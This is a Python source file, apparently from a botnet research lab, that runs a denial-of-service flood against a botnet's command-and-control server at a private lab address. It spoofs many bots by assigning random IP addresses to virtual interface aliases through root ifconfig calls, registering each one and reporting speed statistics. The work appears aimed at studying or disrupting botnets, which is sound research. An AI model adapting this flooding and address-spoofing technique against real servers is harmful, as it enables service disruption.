# dos.py

"""
Description:
This program conducts a Denial of Service attack against the botnet C&C server.

Modules:
    bot             : Defines functions to configure C&C server communication
    cipher          : Defines the CBC encryption/decryption functions
    c_types_defines : Defines ctype structures
    termcolor       : For printing out colored text, $pip install termcolor
    subprocess      : For calling external (shell) command from python

WARNING: 
This program needs root permission to call the "ifconfig" shell command.

"""

import sys
import array
import socket
import fcntl
import struct
import time
import random

from bot import init_socket, communicate, generate_package, process_package
from cipher import pencrypt, pdecrypt
from utils import hexdump, get_ip_address
from c_types_defines import *
from termcolor import cprint
from subprocess import call

# Enable/Disable debug mode
DBG = False

# Bot network interface
IFACE = "vmnet8"
TIMEOUT = 3

# C&C connection IP and Port number
HOST = "10.0.0.128"
PORT = 43242

# C&C commands
RC_SLEEP    = 1
RC_GETWORK  = 2
RC_RESTART  = 3
RC_UPDATE   = 4
RC_BID      = 5
RC_TEMPLATE = 6
RC_CONFIG   = 7
RC_MAILFROM = 8
RC_ACCOUNTS = 9

# Assign a random class A private IP address to interface
def init_iface(iface):
    rand1 = str(random.randint(0,255))
    rand2 = str(random.randint(0,255))
    rand3 = str(random.randint(0,254))
    ip = "10." + rand1 + "." + rand2 + "." + rand3
    call(["ifconfig", iface, ip])
    return ip

def test():
    cprint("Starting test communication...", "green")
    
    s = init_socket(IFACE, TIMEOUT)
    communicate(s)
    s.close()

def main():
    # Start timing
    start = time.time()
    count = 0

    print "[*] Starting DoS attack...\n"

    try:
        while True:
            iface = IFACE + ":" + str(count)

            # Initialize interface
            ip = init_iface(iface)

            # Initialize socket
            s = init_socket(iface)

            # Communicate with the C&C server
            communicate(s)

            count += 1

            if (DBG):
                # Print status
                sys.stdout.write("[")
                cprint(iface, "cyan", end="")
                sys.stdout.write("]\t")
                cprint(ip, "yellow", end="")
                sys.stdout.write("\tcount = ")
                cprint(str(count), "green")

    except Exception as e:
        # Stop timing
        end = time.time()
        run_time = end - start

        print "[-]", e
        if (DBG):
            cprint("\n[*] Bringing network interfaces down...", "red")

        # Bring interfaces down
        for i in range(0, count+1):
            call(["ifconfig", IFACE + ":" + str(i), "down"])

        # Print statistics
        cprint("[*] Statistics:", "yellow")
        cprint("Run time: " + str(run_time), "yellow")
        cprint("Number of bots registered: " + str(count), "yellow")
        cprint("Average register speed (bot per second): " + str(count/run_time), "yellow")
        cprint("Average time taken to register one bot (s): " + str(run_time/count), "yellow")


if __name__ == "__main__":
    main()

